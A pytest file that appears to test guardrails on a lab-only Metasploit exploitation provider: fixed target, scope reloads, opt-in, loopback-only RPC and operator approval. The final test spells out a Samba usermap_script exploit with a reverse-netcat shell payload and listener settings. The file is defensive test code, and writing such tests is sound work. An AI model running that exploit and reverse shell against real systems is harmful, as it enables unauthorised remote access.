from __future__ import annotations

import json

import pytest

from whaxon.core.capabilities import CapabilityRegistry, CapabilityUnavailable
from whaxon.core.lab_access import MetasploitableLabAccessProvider
from whaxon.core.scope import ScopeManager
from whaxon.core.store import JobStore
from whaxon.core.workflow import WorkflowTask


class _FixedMsf:
    def __init__(self, host="127.0.0.1"):
        self.calls = []
        self.config = type("Config", (), {"host": host})()

    def execute(self, module_type, module, options, *, payload, timeout_s):
        self.calls.append((module_type, module, options, payload, timeout_s))
        return {"job_id": "msf-remote-23"}

    def sessions(self):
        return {"7": {
            "via_exploit": "exploit/multi/samba/usermap_script",
            "target_host": "172.28.0.10:139", "type": "shell",
        }}


@pytest.fixture
def lab_provider(tmp_path, monkeypatch):
    data_dir = tmp_path / "data"
    data_dir.mkdir()
    scope_path = data_dir / "scope.json"
    scope_path.write_text(json.dumps({
        "engagement": "controlled-lab",
        "enabled": True,
        "in_scope": ["172.28.0.10"],
        "out_of_scope": [],
        "notes": "unit-test fixture",
    }), encoding="utf-8")
    store = JobStore(data_dir / "jobs.db")
    registry = CapabilityRegistry(store)
    msf = _FixedMsf()
    provider = MetasploitableLabAccessProvider(
        store=store, registry=registry, scope=ScopeManager(scope_path), msf=msf,
    )
    monkeypatch.setenv(MetasploitableLabAccessProvider.ENABLE_ENV, "1")
    return provider, store, msf


def _task(*, target="172.28.0.10", inputs=None):
    return WorkflowTask(
        id="lab-access", capability_id=MetasploitableLabAccessProvider.CAPABILITY,
        target=target, inputs=inputs or {}, permissions=("network.exploit",),
        impact="critical", timeout_s=90,
    )


def test_lab_access_is_fixed_to_the_repository_target(lab_provider):
    provider, _, msf = lab_provider
    with pytest.raises(ValueError, match=r"fixed to 172\.28\.0\.10"):
        provider.resolve_task(_task(target="172.28.0.11"))
    assert not msf.calls


def test_lab_access_rejects_dynamic_module_or_payload_inputs(lab_provider):
    provider, _, msf = lab_provider
    with pytest.raises(ValueError, match="no dynamic inputs"):
        provider.resolve_task(_task(inputs={"module": "exploit/other"}))
    assert not msf.calls


def test_lab_access_requires_explicit_opt_in(lab_provider, monkeypatch):
    provider, _, msf = lab_provider
    monkeypatch.delenv(MetasploitableLabAccessProvider.ENABLE_ENV)
    with pytest.raises(CapabilityUnavailable, match="opt-in is disabled"):
        provider.resolve_task(_task())
    assert not msf.calls


def test_lab_access_reloads_scope_and_refuses_revoked_target(lab_provider):
    provider, _, msf = lab_provider
    scope_path = provider.scope.path
    scope_path.write_text(json.dumps({
        "engagement": "controlled-lab", "enabled": True,
        "in_scope": ["172.28.0.11"], "out_of_scope": [],
    }), encoding="utf-8")
    with pytest.raises(ValueError, match="out of scope"):
        provider.resolve_task(_task())
    assert not msf.calls


def test_lab_access_refuses_non_loopback_msf_rpc(lab_provider):
    provider, _, msf = lab_provider
    msf.config.host = "192.0.2.20"
    with pytest.raises(ValueError, match="RPC must bind to loopback"):
        provider.resolve_task(_task())
    assert not msf.calls


def test_lab_critical_impact_requires_exact_persisted_plan_approval(
    lab_provider, monkeypatch,
):
    import time

    from whaxon.core import Core
    from whaxon.core.providers import BoundProviderRouter
    from whaxon.core.workflow import WorkflowPlan

    provider, store, _ = lab_provider
    core = Core.__new__(Core)
    core.store = store
    core.scope = provider.scope
    core.capabilities = provider.registry
    core.providers = BoundProviderRouter((provider,))
    task = _task()
    plan = WorkflowPlan("lab-mission", (task,), metadata={
        "provider_bindings": {task.id: {
            "provider_id": provider.PROVIDER_ID,
            "manifest_fingerprint": provider.manifest.fingerprint,
        }},
    })
    store.create_mission("lab-mission", "controlled repository lab")
    store.save_workflow_plan("lab-plan", plan)
    assert core.authorize_workflow_task_for_plan("lab-plan", task) is False
    store.grant_workflow_approval(
        "lab-plan", task.id, "lab-approval", "operator",
        expires_at=time.time() + 300,
    )
    assert core.authorize_workflow_task_for_plan("lab-plan", task) is True
    monkeypatch.setenv(provider.ENABLE_ENV, "0")
    assert core.authorize_workflow_task_for_plan("lab-plan", task) is False
    monkeypatch.setenv(provider.ENABLE_ENV, "1")
    assert core.authorize_workflow_task_for_plan("lab-plan", _task(target="172.28.0.11")) is False


@pytest.mark.asyncio
async def test_lab_access_uses_only_fixed_exploit_options_and_seals_job(lab_provider):
    provider, store, msf = lab_provider
    result = await provider.dispatch(_task())
    assert result["session_id"] == "7"
    assert msf.calls == [(
        "exploit", "multi/samba/usermap_script",
        {"RHOSTS": "172.28.0.10", "RPORT": "139", "LHOST": "172.28.0.11",
         "LPORT": "4444"},
        "cmd/unix/reverse_netcat", 60.0,
    )]
    assert store.get_findings(result["job_id"])[0]["data"]["session_id"] == "7"
    finding = store.get_findings(result["job_id"])[0]
    assert finding["data"]["msf_job_id"] == "msf-remote-23"
    assert finding["data"]["session_retention"] == "open_until_operator_closes_in_metasploit"
    session = store.get_session("7")
    assert session["info"]["msf_job_id"] == "msf-remote-23"
    assert session["info"]["evidence_job_id"] == result["job_id"]
